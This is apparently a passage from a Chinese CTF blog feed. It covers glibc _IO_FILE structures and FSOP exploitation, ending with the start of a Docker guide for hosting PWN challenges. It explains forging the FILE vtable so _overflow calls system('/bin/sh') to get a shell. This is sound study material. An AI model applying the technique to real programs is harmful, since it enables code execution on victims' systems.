即将.jpg文件解析为php文件</span></span><br></pre></td></tr></table></figure></div>]]></content>
      
      
      
        <tags>
            
            <tag> ctf-web </tag>
            
            <tag> 文件上传 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>利用_IO_FILE结构</title>
      <link href="/2024/12/05/%E5%88%A9%E7%94%A8-IO-FILE%E7%BB%93%E6%9E%84/"/>
      <url>/2024/12/05/%E5%88%A9%E7%94%A8-IO-FILE%E7%BB%93%E6%9E%84/</url>
      
        <content type="html"><![CDATA[<p>参考<code>《CTF竞赛权威指南(PWN篇)》</code>,<code>ctf.wiki</code></p><h1 id="1-FILE结构体"><a href="#1-FILE结构体" class="headerlink" title="1.FILE结构体"></a>1.FILE结构体</h1><p>文章:<a class="link" href="https://www.yuque.com/yuqueyonghupiiwso/gixo00/bekmilyu3sn6sh3e?singleDoc#">https://www.yuque.com/yuqueyonghupiiwso/gixo00/bekmilyu3sn6sh3e?singleDoc# <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 《FILE结构》</p><p>可以参考上面写的文章，下面简单说一下吧。</p><h2 id="FILE结构体"><a href="#FILE结构体" class="headerlink" title="FILE结构体"></a>FILE结构体</h2><ul><li>FILE结构被被一系列流操作函数(fopen(),fread,fclose()等)所使用、大多数的FILE结构体保存在堆上(stdin,stdout,stderr除外，位于libc数据段)，其指针动态创建并由fopen()函数返回。在libc的2.23版本中，这个结构体是<code>_IO_FILE_plus</code>，包含了一个<code>_IO_FILE</code>结构体和一个指向<code>_IO_jump_t</code>结构体的指针。</li></ul><p>源码网址：<a class="link" href="https://elixir.bootlin.com/glibc/glibc-2.23/source/libio/libioP.h#L307">https://elixir.bootlin.com/glibc/glibc-2.23/source/libio/libioP.h#L307 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    JUMP_FIELD(<span class="type">size_t</span>, __dummy);</span><br><span class="line">    JUMP_FIELD(<span class="type">size_t</span>, __dummy2);</span><br><span class="line">    JUMP_FIELD(_IO_finish_t, __finish);</span><br><span class="line">    JUMP_FIELD(_IO_overflow_t, __overflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __underflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __uflow);</span><br><span class="line">    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);</span><br><span class="line">    <span class="comment">/* showmany */</span></span><br><span class="line">    JUMP_FIELD(_IO_xsputn_t, __xsputn);</span><br><span class="line">    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);</span><br><span class="line">    JUMP_FIELD(_IO_seekoff_t, __seekoff);</span><br><span class="line">    JUMP_FIELD(_IO_seekpos_t, __seekpos);</span><br><span class="line">    JUMP_FIELD(_IO_setbuf_t, __setbuf);</span><br><span class="line">    JUMP_FIELD(_IO_sync_t, __sync);</span><br><span class="line">    JUMP_FIELD(_IO_doallocate_t, __doallocate);</span><br><span class="line">    JUMP_FIELD(_IO_read_t, __read);</span><br><span class="line">    JUMP_FIELD(_IO_write_t, __write);</span><br><span class="line">    JUMP_FIELD(_IO_seek_t, __seek);</span><br><span class="line">    JUMP_FIELD(_IO_close_t, __close);</span><br><span class="line">    JUMP_FIELD(_IO_stat_t, __stat);</span><br><span class="line">    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);</span><br><span class="line">    JUMP_FIELD(_IO_imbue_t, __imbue);</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> 0</span></span><br><span class="line">    get_column;</span><br><span class="line">    set_column;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* We always allocate an extra word following an _IO_FILE.</span></span><br><span class="line"><span class="comment">   This contains a pointer to the function jump table used.</span></span><br><span class="line"><span class="comment">   This is for compatibility with C++ streambuf; the word can</span></span><br><span class="line"><span class="comment">   be used to smash to a pointer to a virtual function table. */</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  _IO_FILE file;</span><br><span class="line">  <span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *<span class="title">vtable</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div><ul><li>vtable指向的函数跳转表其实是一种兼容C++虚函数的实现。当程序对某个流进行操作时，会调用该流对应的跳转表中的某个函数。</li></ul><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> &#123;</span></span><br><span class="line">  <span class="type">int</span> _flags;<span class="comment">/* High-order word is _IO_MAGIC; rest is flags. */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_file_flags _flags</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The following pointers correspond to the C++ streambuf protocol. */</span></span><br><span class="line">  <span class="comment">/* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_read_ptr;<span class="comment">/* Current read pointer */</span></span><br><span class="line">  <span class="type">char</span>* _IO_read_end;<span class="comment">/* End of get area. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_read_base;<span class="comment">/* Start of putback+get area. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_write_base;<span class="comment">/* Start of put area. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_write_ptr;<span class="comment">/* Current put pointer. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_write_end;<span class="comment">/* End of put area. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_buf_base;<span class="comment">/* Start of reserve area. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_buf_end;<span class="comment">/* End of reserve area. */</span></span><br><span class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_save_base; <span class="comment">/* Pointer to start of non-current get area. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_backup_base;  <span class="comment">/* Pointer to first valid character of backup area */</span></span><br><span class="line">  <span class="type">char</span> *_IO_save_end; <span class="comment">/* Pointer to end of non-current get area. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_marker</span> *_<span class="title">markers</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">chain</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> _fileno;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> 0</span></span><br><span class="line">  <span class="type">int</span> _blksize;</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">  <span class="type">int</span> _flags2;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  _IO_off_t _old_offset; <span class="comment">/* This used to be _offset but it&#x27;s too small.  */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __HAVE_COLUMN <span class="comment">/* temporary */</span></span></span><br><span class="line">  <span class="comment">/* 1+column number of pbase(); 0 is unknown. */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">short</span> _cur_column;</span><br><span class="line">  <span class="type">signed</span> <span class="type">char</span> _vtable_offset;</span><br><span class="line">  <span class="type">char</span> _shortbuf[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*  char* _save_gptr;  char* _save_egptr; */</span></span><br><span class="line"></span><br><span class="line">  _IO_lock_t *_lock;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_USE_OLD_IO_FILE</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_complete</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> _<span class="title">file</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined _G_IO_IO_FILE_VERSION &amp;&amp; _G_IO_IO_FILE_VERSION == 0x20001</span></span><br><span class="line">  _IO_off64_t _offset;</span><br><span class="line"><span class="meta"># <span class="keyword">if</span> defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span></span><br><span class="line">  <span class="comment">/* Wide character stream stuff.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span> *_<span class="title">codecvt</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_wide_data</span> *_<span class="title">wide_data</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">freeres_list</span>;</span></span><br><span class="line">  <span class="type">void</span> *_freeres_buf;</span><br><span class="line"><span class="meta"># <span class="keyword">else</span></span></span><br><span class="line">  <span class="type">void</span> *__pad1;</span><br><span class="line">  <span class="type">void</span> *__pad2;</span><br><span class="line">  <span class="type">void</span> *__pad3;</span><br><span class="line">  <span class="type">void</span> *__pad4;</span><br><span class="line"><span class="meta"># <span class="keyword">endif</span></span></span><br><span class="line">  <span class="type">size_t</span> __pad5;</span><br><span class="line">  <span class="type">int</span> _mode;</span><br><span class="line">  <span class="comment">/* Make sure we don&#x27;t get into trouble again.  */</span></span><br><span class="line">  <span class="type">char</span> _unused2[<span class="number">15</span> * <span class="keyword">sizeof</span> (<span class="type">int</span>) - <span class="number">4</span> * <span class="keyword">sizeof</span> (<span class="type">void</span> *) - <span class="keyword">sizeof</span> (<span class="type">size_t</span>)];</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div><ul><li><p><strong>进程中的FILE结构通过_chain域构成一个链表，链表头部为_IO_list_all全局变量，默认情况下依次链接了stddrr、stdout和stdin三个文件流，并将新创建的流插入到头部</strong>。</p></li><li><p>另外，_IO_wide_data也是后面所需要的</p></li></ul><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Extra data for wide character streams.  */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_wide_data</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_read_ptr;<span class="comment">/* Current read pointer */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_read_end;<span class="comment">/* End of get area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_read_base;<span class="comment">/* Start of putback+get area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_write_base;<span class="comment">/* Start of put area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_write_ptr;<span class="comment">/* Current put pointer. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_write_end;<span class="comment">/* End of put area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_buf_base;<span class="comment">/* Start of reserve area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_buf_end;<span class="comment">/* End of reserve area. */</span></span><br><span class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_save_base;<span class="comment">/* Pointer to start of non-current get area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_backup_base;<span class="comment">/* Pointer to first valid character of</span></span><br><span class="line"><span class="comment">   backup area */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_save_end;<span class="comment">/* Pointer to end of non-current get area. */</span></span><br><span class="line"></span><br><span class="line">  <span class="type">__mbstate_t</span> _IO_state;</span><br><span class="line">  <span class="type">__mbstate_t</span> _IO_last_state;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span> _<span class="title">codecvt</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="type">wchar_t</span> _shortbuf[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">  <span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *_<span class="title">wide_vtable</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="meta">#endi</span></span><br></pre></td></tr></table></figure></div><h2 id="2-FSOP"><a href="#2-FSOP" class="headerlink" title="2.FSOP"></a>2.FSOP</h2><ul><li>FSOP（File Stream Oriented Programming）是一种劫持_IO_list_all（libc.so中的全局变量）来伪造链表的利用技术，通过调用_IO_flush_all_lockp()函数触发。该函数会在下面三种情况下被调用：</li></ul><ol><li><p>当libc检测到内存错误从而执行abort流程时；🤯</p></li><li><p>执行exit函数时；🤯🤯</p></li><li><p>当main函数返回时。🤯🤯🤯</p></li></ol><ul><li>当libc检查到内存错误时，会产生下面的函数调用路径</li></ul><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">malloc_printerr-&gt;_libc_message-&gt;_GI_abort-&gt;_IO_flush_all_lockp-&gt;_IO_OVERFLOW</span><br></pre></td></tr></table></figure></div><p>因此衍生出了<code>FSOP</code>，通过伪造、_IO_jump_t中的<code>_overflow</code>为<code>system函数地址</code>，最终在<code>_IO_OVERFLOW(fp,EOF)</code>函数中执行system(‘&#x2F;bin&#x2F;sh’)并获得shell.</p><p><a class="link" href="https://elixir.bootlin.com/glibc/glibc-2.23/source/libio/genops.c#L759">源码地址 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> _IO_flush_all_lockp (<span class="type">int</span> do_lock)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result = <span class="number">0</span>;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *<span class="title">fp</span>;</span></span><br><span class="line">  <span class="type">int</span> last_stamp;</span><br><span class="line">······</span><br><span class="line"></span><br><span class="line">  last_stamp = _IO_list_all_stamp;</span><br><span class="line">  fp = (_IO_FILE *) _IO_list_all; <span class="comment">// 覆盖为伪造的链表</span></span><br><span class="line">  <span class="keyword">while</span> (fp != <span class="literal">NULL</span>) &#123;</span><br><span class="line">      run_fp = fp;</span><br><span class="line">      <span class="keyword">if</span> (do_lock)</span><br><span class="line">_IO_flockfile (fp);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (((fp-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)</span><br><span class="line"># 条件 <span class="keyword">if</span> defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span><br><span class="line">   || (_IO_vtable_offset (fp) == <span class="number">0</span></span><br><span class="line">       &amp;&amp; fp-&gt;_mode &gt; <span class="number">0</span> &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class="line">    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">   )</span><br><span class="line">  &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF) <span class="comment">// fp指向伪造的vtable，触发虚函数</span></span><br><span class="line">result = EOF;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (do_lock)</span><br><span class="line">_IO_funlockfile (fp);</span><br><span class="line">      run_fp = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (last_stamp != _IO_list_all_stamp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* Something was added to the list.  Start all over again.  */</span></span><br><span class="line">  fp = (_IO_FILE *) _IO_list_all;</span><br><span class="line">  last_stamp = _IO_list_all_stamp;</span><br><span class="line">&#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">fp = fp-&gt;_chain; <span class="comment">// 指向下一个_IO_FILE对象</span></span><br><span class="line">    &#125;</span><br><span class="line">.......</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><ul><li>条件</li></ul><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fp-&gt;_mode &lt;= <span class="number">0</span></span><br><span class="line">fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</span><br></pre></td></tr></table></figure></div><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_new_fclose (_IO_FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> status;</span><br><span class="line"></span><br><span class="line">  CHECK_FILE(fp, EOF);</span><br><span class="line">......</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* First unlink the stream.  */</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_file_flags &amp; _IO_IS_FILEBUF)</span><br><span class="line">    _IO_un_link ((<span class="keyword">struct</span> _IO_FILE_plus *) fp);</span><br><span class="line"></span><br><span class="line">  _IO_acquire_lock (fp);</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_file_flags &amp; _IO_IS_FILEBUF)</span><br><span class="line">    status = _IO_file_close_it (fp);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    status = fp-&gt;_flags &amp; _IO_ERR_SEEN ? <span class="number">-1</span> : <span class="number">0</span>;</span><br><span class="line">  _IO_release_lock (fp);</span><br><span class="line">  _IO_FINISH (fp);<span class="comment">// fp指向虚表</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_mode &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">......</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">......</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> status;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>]]></content>
      
      
      
        <tags>
            
            <tag> ctf-pwn </tag>
            
            <tag> 学习资料 </tag>
            
            <tag> IO_FILE </tag>
            
            <tag> house of orange </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PWN出题-docker</title>
      <link href="/2024/12/03/PWN%E5%87%BA%E9%A2%98-docker/"/>
      <url>/2024/12/03/PWN%E5%87%BA%E9%A2%98-docker/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>该文章简单介绍一下pwn出题的基本过程,仅限于docker部分,至于传到写题目的服务器上还没测试过.</p><h1 id="Docker"><a href="#Docker" class="headerlink" title="Docker"></a>Docker</h1><h2 id="第一部分-安装"><a href="#第一部分-安装" class="headerlink" title="第一部分-安装"></a>第一部分-安装</h2><p>引自GPT</p><ul><li>安装相关依赖</li></ul><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt install apt-transport-https ca-certificates curl software-properties-common</span><br></pre></td></tr></table></figure></div><ul><li>添加docker官方的GPG密钥</li></ul><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -fsSL https://download.docker.com/linux/ubuntu/gpg | <span class="built_in">sudo</span> gpg --dearmor -o /usr/share/keyrings/docker-archive-keyring.gpg</span><br></pre></td></tr></table></figure></div><ul><li>添加docker的APT仓库</li></ul><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;deb [arch=amd64 signed-by=/usr/share/keyrings/docker-archive-keyring.gpg] https://download.docker.com/linux/ubuntu <span class="subst">$(lsb_release -cs)</span> stable&quot;</span> | <span class="built_in">sudo</span> <span class="built_in">tee</span> /etc/apt/sources.list.d/docker.list &gt; /dev/null</span><br></pre></td></tr></table></figure></div><ul><li>更新</li></ul><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt update</span><br></pre></td></tr></table></figure></div><ul><li>安装docker</li></ul><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt install docker-ce</span><br></pre></td></tr></table></figure></div><ul><li>启动docker并设置为开机自启</li></ul><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> systemctl start docker</span><br><span class="line"><span class="built_in">sudo</span> systemctl <span class="built_in">enable</span> docker</span><br></pre></td></tr></table></figure></div><ul><li>以非root用户运行docker(可选,若不设置每次docker要以sudo启动)</li></ul><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> usermod -aG docker <span class="variable">$USER</span></span><br><span class="line"><span class="comment"># 然后重新登陆一次,或者:newgrp docker</span></span><br></pre></td></tr></table></figure></div><ul><li>简单测试:</li></ul><div class="highlight-container" data-rel="Dockerfile"><figure class="iseeu highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="keyword">run</span><span class="language-bash"> hello-world</span></span><br></pre></td></tr></table></figure></div><p>效果:</p><p><img lazyload src="/images/loading.svg" data-src="/../capture_20241203132423553.bmp"></p><p>若是不成功就说明被墙了,靠自己解决吧.</p><h2 id="第二部分-指令"><a href="#第二部分-指令" class="headerlink" title="第二部分-指令"></a>第二部分-指令</h2><h3 id="常用的"><a href="#常用的" class="headerlink" title="常用的"></a>常用的</h3><div class="highlight-container" data-rel="Dockerfile"><figure class="iseeu highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">docker version <span class="comment">#查看版本</span></span><br><span class="line">docker info <span class="comment"># 查看 Docker 的系统信息，包括容器和镜像数量等</span></span><br><span class="line"></span><br><span class="line">docker build -t &lt;name&gt; . <span class="comment"># 制作镜像,注意这里有个点</span></span><br><span class="line">docker images <span class="comment"># 查看制作的镜像</span></span><br><span class="line">docker rmi &lt;id&gt; <span class="comment"># 删除本地镜像</span></span><br><span class="line"></span><br><span class="line">docker <span class="keyword">run</span><span class="language-bash"> -dit --name &lt;image_name&gt; --<span class="built_in">rm</span> -p 9999:9999 -v $(<span class="built_in">pwd</span>):/app &lt;<span class="built_in">id</span>&gt; <span class="comment"># 使镜像run起来</span></span></span><br><span class="line">docker ps <span class="comment"># 查看正在运行的容器</span></span><br><span class="line"></span><br><span class="line">docker search &lt;name&gt; <span class="comment"># 在 Docker Hub 中搜索镜像。</span></span><br><span class="line">docker save -o &lt;file&gt; &lt;image&gt; <span class="comment"># 保存镜像到本地文件。</span></span><br></pre></td></tr></table></figure></div><h3 id="容器管理"><a href="#容器管理" class="headerlink" title="容器管理"></a>容器管理</h3><table><thead><tr><th>指令</th><th>描述</th></tr></thead><tbody><tr><td><code>docker ps</code></td><td>查看运行中的容器列表。</td></tr><tr><td><code>docker ps -a</code></td><td>查看所有容器（包括已停止的容器）。</td></tr><tr><td><code>docker run &lt;options&gt; &lt;image&gt;</code></td><td>创建并启动一个容器。</td></tr><tr><td><code>docker start &lt;container&gt;</code></td><td>启动已停止的容器。</td></tr><tr><td><code>docker stop &lt;container&gt;</code></td><td>停止运行中的容器。</td></tr><tr><td><code>docker restart &lt;container&gt;</code></td><td>重启容器。</td></tr><tr><td><code>docker rm &lt;container&gt;</code></td><td>删除容器。</td></tr><tr><td><code>docker logs &lt;container&gt;</code></td><td>查看容器的日志输出。</td></tr><tr><td><code>docker exec -it &lt;container&gt; &lt;command&gt;</code></td><td>在容器中运行命令（交互模式）。</td></tr><tr><td><code>docker attach 